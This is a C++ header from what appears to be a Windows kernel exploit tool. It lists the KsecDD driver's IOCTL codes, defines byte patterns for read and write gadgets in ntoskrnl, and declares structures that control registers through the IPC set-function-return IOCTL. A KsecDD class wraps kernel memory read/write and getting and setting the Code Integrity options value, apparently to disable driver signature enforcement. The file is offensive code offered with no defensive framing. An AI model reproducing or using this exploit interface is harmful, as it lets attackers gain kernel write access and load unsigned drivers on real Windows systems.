#pragma once

#include <Windows.h>

// ntddksec.h
#define DD_KSEC_DEVICE_NAME_U L"\\Device\\KsecDD"
#define IOCTL_KSEC_CONNECT_LSA                      CTL_CODE(FILE_DEVICE_KSEC,  0, METHOD_BUFFERED,     FILE_WRITE_ACCESS ) // 0x398000 (KsecDispatch)
#define IOCTL_KSEC_RNG                              CTL_CODE(FILE_DEVICE_KSEC,  1, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_RNG_REKEY                        CTL_CODE(FILE_DEVICE_KSEC,  2, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_ENCRYPT_MEMORY                   CTL_CODE(FILE_DEVICE_KSEC,  3, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_DECRYPT_MEMORY                   CTL_CODE(FILE_DEVICE_KSEC,  4, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_ENCRYPT_MEMORY_CROSS_PROC        CTL_CODE(FILE_DEVICE_KSEC,  5, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_DECRYPT_MEMORY_CROSS_PROC        CTL_CODE(FILE_DEVICE_KSEC,  6, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_ENCRYPT_MEMORY_SAME_LOGON        CTL_CODE(FILE_DEVICE_KSEC,  7, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_DECRYPT_MEMORY_SAME_LOGON        CTL_CODE(FILE_DEVICE_KSEC,  8, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS )
#define IOCTL_KSEC_FIPS_GET_FUNCTION_TABLE          CTL_CODE(FILE_DEVICE_KSEC,  9, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_ALLOC_POOL                       CTL_CODE(FILE_DEVICE_KSEC, 10, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390028 KsecIoctlAllocPool
#define IOCTL_KSEC_FREE_POOL                        CTL_CODE(FILE_DEVICE_KSEC, 11, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x39002c KsecIoctlFreePool
#define IOCTL_KSEC_COPY_POOL                        CTL_CODE(FILE_DEVICE_KSEC, 12, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390030 KsecIoctlCopyPool
#define IOCTL_KSEC_DUPLICATE_HANDLE                 CTL_CODE(FILE_DEVICE_KSEC, 13, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390034 KsecIoctlDupLsaHandle
#define IOCTL_KSEC_REGISTER_EXTENSION               CTL_CODE(FILE_DEVICE_KSEC, 14, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390038 KsecRegisterExtension
#define IOCTL_KSEC_CLIENT_CALLBACK                  CTL_CODE(FILE_DEVICE_KSEC, 15, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x39003c KsecIoctlClientCallback
#define IOCTL_KSEC_GET_BCRYPT_EXTENSION	            CTL_CODE(FILE_DEVICE_KSEC, 16, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_GET_SSL_EXTENSION                CTL_CODE(FILE_DEVICE_KSEC, 17, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_GET_DEVICECONTROL_EXTENSION	    CTL_CODE(FILE_DEVICE_KSEC, 18, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_ALLOC_VM                         CTL_CODE(FILE_DEVICE_KSEC, 19, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x39004c KsecIoctlAllocVm
#define IOCTL_KSEC_FREE_VM                          CTL_CODE(FILE_DEVICE_KSEC, 20, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390050 KsecIoctlFreeVm
#define IOCTL_KSEC_COPY_VM                          CTL_CODE(FILE_DEVICE_KSEC, 21, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390054 KsecIoctlCopyVm
#define IOCTL_KSEC_CLIENT_FREE_VM                   CTL_CODE(FILE_DEVICE_KSEC, 22, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_INSERT_PROTECTED_PROCESS_ADDRESS CTL_CODE(FILE_DEVICE_KSEC, 23, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x39005c KsecIoctlInsertProtectedProcessAddress
#define IOCTL_KSEC_REMOVE_PROTECTED_PROCESS_ADDRESS CTL_CODE(FILE_DEVICE_KSEC, 24, METHOD_BUFFERED,     FILE_ANY_ACCESS ) // 0x390060 KsecIoctlRemoveProtectedProcessAddress
#define IOCTL_KSEC_GET_BCRYPT_EXTENSION2            CTL_CODE(FILE_DEVICE_KSEC, 25, METHOD_BUFFERED,     FILE_ANY_ACCESS )
#define IOCTL_KSEC_IPC_GET_QUEUED_FUNCTION_CALLS    CTL_CODE(FILE_DEVICE_KSEC, 26, METHOD_OUT_DIRECT,   FILE_ANY_ACCESS ) // 0x39006a (KsecDispatch)
#define IOCTL_KSEC_IPC_SET_FUNCTION_RETURN          CTL_CODE(FILE_DEVICE_KSEC, 27, METHOD_NEITHER,      FILE_ANY_ACCESS ) // 0x39006f KsecIoctlHandleFunctionReturn
#define IOCTL_KSEC_AUDIT_SELFTEST_SUCCESS           CTL_CODE(FILE_DEVICE_KSEC, 28, METHOD_NEITHER,      FILE_ANY_ACCESS )
#define IOCTL_KSEC_AUDIT_SELFTEST_FAILURE           CTL_CODE(FILE_DEVICE_KSEC, 29, METHOD_BUFFERED,     FILE_ANY_ACCESS )

#define KSEC_EVENT_NAME_U L"\\SECURITY\\LSA_AUTHENTICATION_INITIALIZED"

// Gadget in 'ntoskrnl!ViThunkReplacePristine'
// 488B4110498900B801000000C3
#define PATTERN_READ_MEMORY { \
    0x48, 0x8B, 0x41, 0x10,         /* MOV   RAX, qword ptr [RCX + 0x10] */ \
    0x49, 0x89, 0x00,               /* MOV   qword ptr [R8], RAX         */ \
    0xB8, 0x01, 0x00, 0x00, 0x00,   /* MOV   EAX, 0x1                    */ \
    0xC3                            /* RET                               */ \
}

// 8911C3
#define PATTERN_WRITE_MEMORY { \
    0x89, 0x11,                     /* MOV   dword ptr [RCX], EDX        */ \
    0xC3                            /* RET                               */ \
}

typedef struct _FUNCTION_RETURN
{
    PVOID Function; // Control RAX in CALL
    PVOID Argument; // Control RCX in CALL
} FUNCTION_RETURN, * PFUNCTION_RETURN;

typedef struct _SET_FUNCTION_RETURN_REQ
{
    PFUNCTION_RETURN FunctionReturn;
    DWORD Value; // Control EDX in CALL
} SET_FUNCTION_RETURN_REQ, * PSET_FUNCTION_RETURN_REQ;

class KsecDD
{
public:
    KsecDD();
    ~KsecDD();

    BOOL IsInitialized() const;
    BOOL IsConnected();
    BOOL Connect();
    BOOL Disconnect();
    BOOL QueryCiOptionsValue(OUT PDWORD CiOptions);
    BOOL SetCiOptionsValue(IN DWORD CiOptions);

private:
    HANDLE m_hDevice;
    BOOL m_bIsInitialized;
    ULONG_PTR m_pKernelBaseAddress;
    ULONG_PTR m_pCiBaseAddress;
    DWORD m_dwCiOptionsOffset;
    DWORD m_dwReadGadgetOffset;
    DWORD m_dwWriteGadgetOffset;
    ULONG_PTR m_pReadGadgetAddress;
    ULONG_PTR m_pWriteGadgetAddress;

    BOOL CheckIsInitialized();
    BOOL SetLsaInitializedEvent(IN LPCWSTR Event);
    BOOL OpenDevice(IN LPCWSTR Name, OUT PHANDLE Device);
    BOOL DeviceIoControl(IN HANDLE Device, IN DWORD IoControlCode, IN OPTIONAL LPVOID InBuffer, IN DWORD InBufferSize, OUT OPTIONAL LPVOID OutBuffer, IN DWORD OutBufferSize);
    
    BOOL IoctlConnectLsa(OUT OPTIONAL PDWORD SystemPid);
    BOOL IoctlIpcSetFunctionReturn(IN PSET_FUNCTION_RETURN_REQ Request);

    BOOL ReadKernelMemory32(IN ULONG_PTR Address, OUT PUINT32 Value);
    BOOL ReadKernelMemory64(IN ULONG_PTR Address, OUT PUINT64 Value);
    BOOL WriteKernelMemory32(IN ULONG_PTR Address, IN UINT32 Value);
};